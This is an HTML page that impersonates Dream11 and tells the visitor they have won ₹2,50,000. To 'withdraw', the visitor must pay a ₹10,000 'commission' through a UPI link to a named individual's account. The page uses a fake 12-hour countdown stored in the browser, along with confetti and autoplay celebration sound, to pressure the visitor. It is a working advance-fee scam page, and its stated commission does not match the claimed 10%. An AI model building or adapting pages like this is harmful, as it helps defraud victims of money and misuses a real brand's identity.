<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Withdraw Winnings</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background: #e90606;
      margin: 0;
      padding: 50px;
      color: white;
    }
    .container {
      background: white;
      color: black;
      padding: 30px;
      border-radius: 10px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }
    .logo {
      width: 120px;
      margin-bottom: 20px;
    }
    .amount {
      font-size: 28px;
      color: green;
      margin: 20px 0;
    }
    .note {
      margin: 10px 0;
      font-size: 16px;
      color: #333;
    }
    #countdown {
      font-size: 20px;
      color: red;
      margin: 10px 0;
    }
    .btn {
      display: inline-block;
      background-color: #28a745;
      color: white;
      padding: 15px 25px;
      font-size: 18px;
      text-decoration: none;
      border-radius: 5px;
      margin-top: 20px;
    }
    .expired {
      color: red;
      font-size: 22px;
      margin-top: 30px;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="logo.png" alt="Dream11 Logo" class="logo">
    <h1>Congratulations!</h1>
    <div class="amount">Your Withdrawal Amount: ₹2,50,000</div>
    <div class="note">To withdraw, pay 10% commission (₹10,000)</div>
    <div id="countdown"></div>
    <a id="withdrawBtn" href="#" class="btn">Withdraw Now</a>
    <div id="expiredMsg" class="expired" style="display: none;">Link Expired</div>
  </div>

  <canvas id="confetti-canvas" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;"></canvas>

  <!-- Celebration Sound -->
  <audio id="celebration-sound" autoplay>
    <source src="sounds/celebration.mp3" type="audio/mpeg">
  </audio>

  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <script>
    // Confetti burst on load
    confetti({ particleCount: 200, spread: 90, origin: { y: 0.6 } });

    // Sound on load
    window.addEventListener('DOMContentLoaded', () => {
      const audio = document.getElementById('celebration-sound');
      audio.play().catch(e => console.log("Autoplay blocked:", e));
    });

    // Countdown logic
    const countdownEl = document.getElementById("countdown");
    const withdrawBtn = document.getElementById("withdrawBtn");
    const expiredMsg = document.getElementById("expiredMsg");

    const storageKey = 'withdrawalStartTime';
    let startTime = localStorage.getItem(storageKey);

    if (!startTime) {
      startTime = new Date().getTime();
      localStorage.setItem(storageKey, startTime);
    } else {
      startTime = parseInt(startTime);
    }

    const twelveHours = 12 * 60 * 60 * 1000;

    function updateCountdown() {
      const now = new Date().getTime();
      const distance = startTime + twelveHours - now;

      if (distance <= 0) {
        countdownEl.style.display = 'none';
        withdrawBtn.style.display = 'none';
        expiredMsg.style.display = 'block';
        return;
      }

      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
      countdownEl.innerHTML = `Time left: ${hours}h ${minutes}m ${seconds}s`;
    }

    updateCountdown();
    setInterval(updateCountdown, 1000);

    // UPI redirect
    withdrawBtn.href = "upi://pay?pa=6005973034@ybl&pn=Ram%20Choudhary&am=10000&cu=INR";
  </script>

</body>
</html>
